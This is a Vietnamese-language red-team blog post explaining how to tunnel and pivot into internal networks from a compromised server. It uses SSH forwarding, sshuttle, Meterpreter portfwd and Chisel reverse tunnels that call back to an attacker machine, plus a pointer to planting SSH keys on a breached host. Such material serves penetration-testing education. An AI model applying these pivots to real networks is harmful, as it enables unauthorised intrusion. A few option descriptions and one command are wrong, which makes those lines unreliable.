+++
title = "Tunneling, Pivoting to Attack Internal Network"
description = ""
type = ["posts","post"]
tags = [
    "infosec",
    "tunnel",
]
date = "2021-07-30"
categories = [
    "infosec",
    "tunnel",
]
series = [""]
[ author ]
  name = "Quac Tran"
+++
* [Intro](#Intro)
* [Tools for tunneling](#tools-for-tunneling)
  * [SSH Tunnel](#ssh-tunnel)
    * [Local Port Porwarding](#local-port-forwarding)
    * [Remote Port Porwarding](#remote-port-forwarding)
    * [Dynamic Port Porwarding](#dynamic-port-forwarding)
    * [Sshuttle](#sshuttle)
  * [Netword Layer Tunnel](#netword-layer-tunnel)
  * [Transport Layer Tunnel](#transport-layer-tunnel)
  * [Application Layer Tunnel](#application-layer-tunnel)
  * [Other tools pivoting without SSH](#other-tools-pivoting-without-ssh)
    * [Metasploit Framework](#metasploit-framework)
    * [Chisel](#chisel)
    * [Ssf](#ssf)
* [Create SOCKS Proxy to Attack Internal Network](#create-socks-proxy-to-attack-internal-network)
* [Refer](#refer)
## Intro
- Có rất nhiều bài viêt,blog nói về việc tấn công,xâm nhập mạng nội bộ trên Internet, nhưng hầu hết trong số chúng tập trung vào việc sử dụng các công cụ, các nguyên tắc, tình huống ít được đề cập, giải thích nhiều. Bài viết này tôi sẽ thảo luận về nguyên tắc tấn công mạng nội bộ đa dạng, thiết kế linh hoạt sơ đồ tấn công mạng nội bộ tương ứng theo các tình huống của mạng nội bộ khác nhau. Đây cũng là một trong những chủ đề tôi yêu thích nhất trong an ninh mạng và hoạt động của red team nói chung.

- Tấn công,xâm nhập mạng nội bộ là sử dụng các công nghệ *tunnel* khác nhau để vượt qua sự phong tỏa, phát hiện của tường lửa với các giao thức được tường lửa cho phép để đạt được quyền truy cập vào mạng mục tiêu bị chặn.

- Công nghệ *tunnel* (đường hầm) là một cách để truyền dữ liệu giữa các mạng bằng cách sử dụng cơ sở hạ tầng của Internet. Dữ liệu được truyền bằng *tunnel* có thể là các *frame* dữ liệu hoặc các *package* của các protocol khác nhau. *Tunnel protocol* đóng gói lại các *frame* dữ liệu hoặc *package* dữ liệu của các *protocol* khác này trong một *header* mới để truyền. *Header* mới cung cấp thông tin định tuyến để dữ liệu được đóng gói có thể được truyền qua Internet. Các package dữ liệu đóng gói được định tuyến giữa hai *endpoint* của *tunnel* thông qua mạng internet. Đường dẫn logic mà package dữ liệu đã đóng gói được truyền qua Internet được gọi là *tunnel*. Khi kết thúc, dữ liệu sẽ được giải nén và chuyển tiếp đến đích cuối cùng. Lưu ý rằng công nghệ tunnel đề cập đến toàn bộ quá trình bao gồm đóng gói, truyền và giải nén dữ liệu.

- Các công nghệ *tunnel* mà chúng tôi thường sử dụng để xâm nhập mạng nội bộ bao gồm dns tunnel, http tunnel, ssh tunnel, icmp (ping) tunnel và các giao thức khác mà tường lửa cho phép.

- Các công nghệ tunnel này có thể được phân lớp theo lớp giao thức:
  - Netword layer tunnel: ICMP tunnel, v.v.
  - Transport layer tunnel: TCP tunnel, UDP tunnel
  - Application layer tunnel: HTTP, DNS, SSH và các tunnel khác
## Tools for Tunneling
### SSH Tunnel
- Vì đây là một phần quan trọng và sử dụng cực kì hữu ích trong thực tế nên tôi sẽ nói kĩ về nó. Nó nằm trong Application layer tunnel.
#### Local Port Forwarding
- `ssh [USER@]SSH_SERVER -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT`\
-> Tất cả traffic đến [LOCAL_IP:]LOCAL_PORT sẽ được forward đến DESTINATION:DESTINATION_PORT qua ssh tunnel

- `ssh [USER@]SSH_SERVER -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT -L [LOCAL_IP2:]LOCAL_PORT2:DESTINATION2:DESTINATION_PORT2`\
-> Multi local port forwarding

- `ssh user@10.66.66.4 -CNfg -L 13389:127.0.0.1:3389`\
-> Tất cả traffic đến 13389 trên localhost sẽ được forward tới 127.0.0.1:3389 trên server

- `ssh user@10.66.66.4 -CNfg -L 13389:10.9.9.123:3389`\
-> Tất cả traffic đến 13389 trên localhost sẽ được forward tới 10.9.9.123:3389 nếu từ server có thể kết nối đến 10.9.9.123:3389

- `ssh user@103.81.86.132 -p 9123 -CNfg -L 13389:10.9.9.123:3389`\
-> Có thể forward port ssh từ local lên server public (remote port forwarding) để tất cả mọi người từ bên ngoài đều có thể kết nối được đến 10.9.9.123:3389 (mạng local)

- `ssh user@103.81.86.132 -p 9123 -CNfg -L 13389:10.9.9.123:3389 -L 13390:10.9.9.123:3390 -L 13391:10.9.9.123:3391`\
-> Ví dụ multi local port forwarding\
- **Local port forwarding thường được sử dụng để kéo một port từ server hoặc trong vùng mạng với server -> local**

- **Ví dụ thực tế**
- Kịch bản:\
      &nbsp;&nbsp;&nbsp;&nbsp;[KALI]&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;[Debian]&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;[Windows Server]\
10.10.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.10.10\
     -----------------------X-------------------------------------->   tcp/445\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------V--------->   tcp/445\
     -----------V-----------------> tcp/22
- Trong trường hợp này : Khi ta khai thác và chiếm quyền kiểm soát được máy chủ 192.168.10.10 của mục tiêu. 172.16.10.10 là một máy chủ nội bộ, không có kết nối internet và không thể kết nối đến mạng bên ngoài. Giả sử nó đang mở port 445. Vậy làm sao có thể khai thác và enum thông tin của nó từ máy của chúng ta?
- From KALI : `ssh -N -L 0.0.0.0:4445:172.16.10.10:445 root@192.168.10.10`
- Sau khi sử dụng lệnh này trên máy KALI chúng ta có thể truy cập 172.16.10.10:445 từ `localhost:445`
#### Remote Port Forwarding
- `ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER`\
-> Tất cả traffic đến [REMOTE:]REMOTE_PORT trên server sẽ forward đến DESTINATION:DESTINATION_PORT (client)

- `ssh user@remote.host -CNfg -R 8080:127.0.0.1:3000`\
-> Tất cả traffic đến port 8080 trên server sẽ được forward đến 127.0.0.1:3000 trên máy của bạn

- `ssh -tt -R 3389:localhost:3389 root@103.81.86.132 -p 9020 ssh -L 103.81.86.132:3389:127.0.0.1:3389 root@localhost -p 9020`\
-> Ví dụ bạn có một server public. Bạn có thể sử dụng lệnh này để kéo port 3389 từ local lên server để mọi người từ internet có thể kết nối đến (trong trường hợp này là remote desktop). Vì remote port fowarding mặc định chỉ foward đến interface 127.0.0.1 nên tả sẽ sử dụng thêm một lệnh local port fowarding nữa để chuyển traffic qua interface public.

- **Remote port forwarding thường được sử dụng để kéo 1 port từ local hoặc trong vùng mạng của local -> server**

- **Ví dụ thực tế**
- Kịch bản:\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[KALI]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Debian]               
103.81.86.132&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.10.10      
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Compromised)\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----------X----------> tcp/22\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----------X----------> tcp/3306\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ANY <------V--------------
- From Debian : `ssh -N -R 103.81.86.132:2221:127.0.0.1:3306 kali@10.10.10.10`
- Bây giờ trên Kali, khi traffic đến tcp / 2221, nó sẽ chuyển đến tcp / 3306 của Debian
#### Dynamic Port Forwarding
- `ssh -D [LOCAL_IP:]LOCAL_PORT [USER@]SSH_SERVER`
- `ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1`
-> Lúc này 127.0.0.1:7777 sẽ đóng vai trò như một SOCKS proxy forward mọi traffic qua nó đến vùng mạng của server
- **Dymanic port forwarding được sử dụng để tạo SOCKS proxy để truy cập mọi IP, port trên mạng server qua SOCKs proxy**

- **Ví dụ thực tế**
- Kịch bản:\
&nbsp;&nbsp;&nbsp;[KALI]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Debian]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Windows Server]\
10.10.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.10.10\
-------------------------X-------------------------------------->   tcp/445\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------V--------->   tcp/445\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------V--------->   tcp/any\
     -----------V-----------------> tcp/22
- From Kali: `ssh -N -D 127.0.0.1:8080 user@192.168.10.10`
- Lúc này 127.0.0.1:8080 đóng vai trò như một SOCKS proxy forward toàn bộ traffic đi qua nó tới vùng mạng mà 192.168.10.10 có thể kết nối đến.
- Nếu là http traffic có thể sử dụng FoxyProxy, traffic khác có thể sử dụng proxychains
- Cấu hình /etc/proxychains.conf:
```bash 
...
socks4 127.0.0.1 8080
```
- Scan nmap qua proxychains: `proxychains --top-ports -sT -Pn 172.16.10.10`
#### Options
- Options:\
-C Requests compression of all data (including stdin, stdout, stderr, and data for forwarded X11 and TCP connections)\
-N Do not execute a remote command. This is useful for just forwarding ports\
-g Allows remote hosts to connect to local forwarded ports.\
-L Local port forwarding\
-R Local port forwarding\
-D Local port forwarding (SOCKS proxy)\
-p port
#### Sshuttle
- Một công cụ rất hay chúng ta cũng có thể sử dụng là sshuttle (https://github.com/sshuttle/sshuttle)
- Install
  - Debian    : `apt-get install sshuttle -y`
  - Rpm-based : `yum install sshuttle`
- Usage
  - `sshuttle -r USERNAME@SERVER_IP 0.0.0.0/0 -vv` (mọi kết nối sẽ đi qua server)
  - `sshuttle -r sean@10.11.1.251 10.1.1.27` (tạo kết nối trực tiếp đến 10.1.1.27 thông qua trung gian 10.11.1.251)
  - `sshuttle -r sean@10.11.1.251 10.1.1.27/24` (tạo kết nối trực tiếp đến 10.1.1.27/24 thông qua trung gian 10.11.1.251)\
  - `nmap -Pn -v -sT -sV -p 22,80,443,21,25 10.1.1.27/24`(có thể sử dụng nmap scan trực tiếp không cần qua proxy như ssh dynamic port fowarding)
#### Chú ý
- Trong thực tế giả sử bạn có quyền truy cập máy chủ thông qua một lỗ hổng web hay ứng dụng, chúng ta không có thông tin đăng nhập của ssh. Bạn hoàn toàn có thể tạo một cặp key từ máy chủ và có thể ssh qua private key của nó với options `-i` như phần đầu tiên trong bài viết này của tôi :\
https://tranquac.com/posts/2021/06/linux-backdoors/
### Netword Layer Tunnel
- Tôi sẽ giới thiệu một số công cụ các bạn có thể tự nghiên cứu và thực hành
- ICMP tunnel:
  - icmpsh (https://github.com/bdamele/icmpsh)
  - icmptunnel (https://github.com/DhavalKapil/icmptunnel)
  - pingtunnel (https://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/)
### Transport Layer Tunnel
- TCP tunnel, UDP tunnel:
  - netcat
  - powercat
  - socat
  - netsh
  - lcx
  - NATBypass
  - iox
### Application Layer Tunnel
- HTTP, DNS, SSH và các tunnel khác. SSH tôi đã nói rất chi tiết ở trên.
  - dnscat2
  - dnscat2-powershell
  - dns2tcp
  - iodine
  - reGeorg
  - Neo-reGeorg
  - reDuh
  - Tunna
  - ABPTTS
  - EarthWorm
  - Termite
  - Venom
  - ssocks
  - s5.go
### Other tools pivoting without SSH
#### Metasploit Framework
- Khi có shell meterpreter bạn hoàn toàn có thể sử dụng để tạo tunnel dễ dàng. Không cần phải có thông tin đăng nhập giống SSH. Với SSH ta phải có một tài khoản đăng nhập hay private-key SSH của server thì mới có thể kết nối đến và tạo tunnel.
```bash
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
     -L >opt>  The local host to listen on (optional).
     -h        Help banner.
     -l >opt>  The local port to listen on.
     -p >opt>  The remote port to connect on.
     -r >opt>  The remote host to connect on.
meterpreter >
```
```bash
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.191
[*] Local TCP relay created: 0.0.0.0:3389 >-> 172.16.194.191:3389
meterpreter > 
```
-> Tạo một tunnel forward toàn bộ traffic đến port 3339 trên localhost tới 172.16.194.191 qua pivot là máy đang có shell meterpreter hiện tại.Nó cũng tương tự SSH local port forwarding vậy đó.
```bash
meterpreter > portfwd delete –l 3389 –p 3389 –r 172.16.194.191
[*] Successfully stopped TCP relay on 0.0.0.0:3389
meterpreter > 
```
-> Hủy một tunnel
- Liệt kê tất cả tunnel : `meterpreter > portfwd list`
- Xóa tất cả tunnel : `portfwd flush`
- Xem chi tiết hơn tại : https://www.offensive-security.com/metasploit-unleashed/portfwd/
#### Chisel
- A fast TCP/UDP tunnel over HTTP (https://github.com/jpillora/chisel)
- Sử dụng thông thường: Ví dụ Kali hoặc máy tấn công khác có IP là 10.10.15.13, máy client có IP là 10.10.10.10.
- Trên máy tấn công bắt đầu tạo chisel server lắng nghe trên port 8000: 
```bash
./chisel server -p 8000 --reverse
```
- Trên máy client:
| Command                                                  | Description                                                     |
| --------------------------------------------             | ---------------------------------------------------------       |
| chisel client 10.10.15.13:8000 R:80:127.0.0.1:80 R:389:localhost:389          | Listen on Kali 80,389, forward to localhost port 80,389 on client       |
| chisel client 10.10.15.13:8000 R:4444:10.10.10.214:80    | Listen on Kali 4444, forward to 10.10.10.214 port 80            |
| chisel client 10.10.15.13:8000 R:socks                   | Create SOCKS5 listener on 1080 on Kali, proxy through client    |
- Lưu ý là Chisel phải chạy cả trên server và client
#### Ssf
- https://github.com/securesocketfunneling/ssf
## Create SOCKS Proxy to Attack Internal Network
### Ssh
- [Dynamic Port Porwarding](#dynamic-port-forwarding)
- Cũng có thể tạo một SOCKS proxy là chính máy của bạn: `ssh user@localhost -CNfg -D 9000`
- [Sshuttle](#sshuttle)
### Powershell
- https://www.varonis.com/blog/nmap-reverse-proxies/
- https://tokyoneon.github.io/
- https://github.com/tokyoneon/Invoke-SocksProxy
### RDP
1. **Client**: Register the `UDVC-Plugin.dll` on the system (https://github.com/earthquake/UniversalDVC#installation)
2. **Client**: connect via `RDP` to the server (by default it will create the virtual channel on all RDP connections, by binding the TCP port 31337)
3. Copy `UDVC-Server.exe` and the `SSF package` on the remote server
4. **Server**: execute `ssfd.exe -p 9898`
5. **Server**: execute `UDVC-Server.exe -c -p 9898 -i 127.0.0.1`
6. **Client**: execute `ssf.exe -D 9999 -p 31337 127.0.0.1`\
-> At this point you will have the socks server listening on port 9999 of your client.
### Metasploit Framework
- https://www.offensive-security.com/metasploit-unleashed/proxytunnels/
### Cobalt Strike
- https://www.cobaltstrike.com/help-socks-proxy-pivoting
### HTTP
- https://blog.csdn.net/qq_34801745/article/details/108896857
### DNS
- http://blog.dengxj.com/archives/14/
### ICMP
- https://blog.csdn.net/qq_34801745/article/details/108896857
## Refer
- https://blog.csdn.net/qq_34801745/article/details/108896857
- https://blog.csdn.net/qq_34801745/article/details/109022922
- https://www.ms509.com/2020/06/17/Intranet-penetration/
- https://techblog.mediaservice.net/2019/10/remote-desktop-tunneling-tips-tricks/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md



  




